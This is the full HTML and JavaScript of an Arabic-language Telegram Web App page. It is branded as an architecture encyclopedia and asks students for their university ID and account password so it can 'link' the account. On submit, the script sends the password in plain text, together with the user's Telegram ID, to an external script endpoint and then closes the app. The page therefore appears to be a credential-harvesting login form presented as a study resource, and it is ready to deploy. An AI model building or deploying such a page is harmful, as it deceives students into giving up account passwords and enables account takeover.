<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المكتب المعماري | محمد سويدان</title>
    <link rel="preconnect" href="https://googleapis.com">
    <link rel="preconnect" href="https://gstatic.com" crossorigin>
    <link href="https://googleapis.com" rel="stylesheet">
    <script src="https://telegram.org"></script>
    <style>
        :root {
            --bg-color: #121824;
            --card-bg: #1e293b;
            --text-color: #f8fafc;
            --text-muted: #94a3b8;
            --input-bg: #0f172a;
            --input-border: #334155;
            --primary-color: #10b981;
            --primary-hover: #059669;
            --header-bg: #0f172a;
            --icon-color: #ffffff;
        }
        [data-theme="light"] {
            --bg-color: #f1f5f9;
            --card-bg: #ffffff;
            --text-color: #0f172a;
            --text-muted: #64748b;
            --input-bg: #f8fafc;
            --input-border: #cbd5e1;
            --primary-color: #10b981;
            --primary-hover: #059669;
            --header-bg: #e2e8f0;
            --icon-color: #000000;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            transition: background-color 0.3s, color 0.3s;
        }
        .app-header {
            width: 100%;
            background-color: var(--header-bg);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
            border-bottom: 1px solid var(--input-border);
        }
        .brand-title {
            font-size: 16px;
            font-weight: 700;
        }
        .theme-btn {
            background: none;
            border: none;
            padding: 8px;
            cursor: pointer;
            font-size: 24px;
            color: var(--icon-color);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s ease, color 0.3s;
        }
        .theme-btn:hover {
            transform: scale(1.1);
        }
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
        }
        .card {
            background-color: var(--card-bg);
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            border: 1px solid var(--input-border);
            transition: background-color 0.3s, border-color 0.3s;
        }
        .icon-box {
            font-size: 45px;
            color: var(--primary-color);
            margin-bottom: 15px;
        }
        h2 {
            margin: 0 0 10px 0;
            font-size: 24px;
            font-weight: 700;
        }
        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .form-group {
            text-align: right;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-muted);
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border-radius: 8px;
            border: 1px solid var(--input-border);
            background-color: var(--input-bg);
            color: var(--text-color);
            font-family: 'Jura', sans-serif;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            text-align: center;
            transition: all 0.3s;
        }
        input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background-color: var(--primary-color);
            color: white;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: var(--primary-hover);
        }
        .status-msg {
            margin-top: 15px;
            font-size: 14px;
            font-weight: 600;
            display: none;
        }
    </style>
</head>
<body>

    <header class="app-header">
        <div class="brand-title">المكتب المعماري | محمد سويدان</div>
        <button class="theme-btn" id="themeToggle" onclick="toggleTheme()">
            <span id="themeIcon">☀️</span>
        </button>
    </header>

    <div class="container">
        <div class="card">
            <div class="icon-box">🏛️</div>
            <h2>موسوعة العمارة</h2>
            <div class="subtitle">الرجاء إدخال بياناتك الأكاديمية للمطابقة والتحقق التلقائي مع الحساب الموثق.</div>
            
            <form id="loginForm" onsubmit="sendData(event)">
                <div class="form-group">
                    <label>الرقم الجامعي:</label>
                    <input type="text" id="uniId" placeholder="أدخل رقمك الجامعي" required autocomplete="off">
                </div>
                <div class="form-group">
                    <label>كلمة المرور:</label>
                    <input type="password" id="password" placeholder="أدخل كلمة مرور الحساب" required>
                </div>
                <button type="submit" id="submitBtn" class="submit-btn">تسجيل الدخول وربط الحساب</button>
            </form>
            <div id="statusMessage" class="status-msg"></div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const userTelegramId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "123456789";
        const scriptUrl = "https://google.com";

        function toggleTheme() {
            const body = document.body;
            const currentTheme = body.getAttribute('data-theme');
            const themeIcon = document.getElementById('themeIcon');

            if (currentTheme === 'light') {
                body.removeAttribute('data-theme');
                themeIcon.innerText = '☀️';
            } else {
                body.setAttribute('data-theme', 'light');
                themeIcon.innerText = '🌙';
            }
        }

        function sendData(event) {
            event.preventDefault();
            const uniId = document.getElementById('uniId').value.trim();
            const password = document.getElementById('password').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const statusMessage = document.getElementById('statusMessage');
            
            if(!uniId || !password) return;

            submitBtn.disabled = true;
            statusMessage.style.display = "block";
            statusMessage.style.color = "var(--primary-color)";
            statusMessage.innerText = "جاري إرسال البيانات والربط الفوري...";

            const payload = {
                action: "auth_submit",
                telegram_id: userTelegramId,
                uni_id: uniId,
                password: password
            };

            fetch(scriptUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(() => {
                statusMessage.style.color = "#10b981";
                statusMessage.innerText = "تم إرسال بياناتك بنجاح! سيتم فحصها وإشعارك فوراً.";
                setTimeout(() => {
                    tg.close();
                }, 2500);
            })
            .catch(() => {
                submitBtn.disabled = false;
                statusMessage.style.color = "#ef4444";
                statusMessage.innerText = "فشل الاتصال بالسيرفر السحابي. يرجى المحاولة لاحقاً.";
            });
        }
    </script>
</body>
</html>
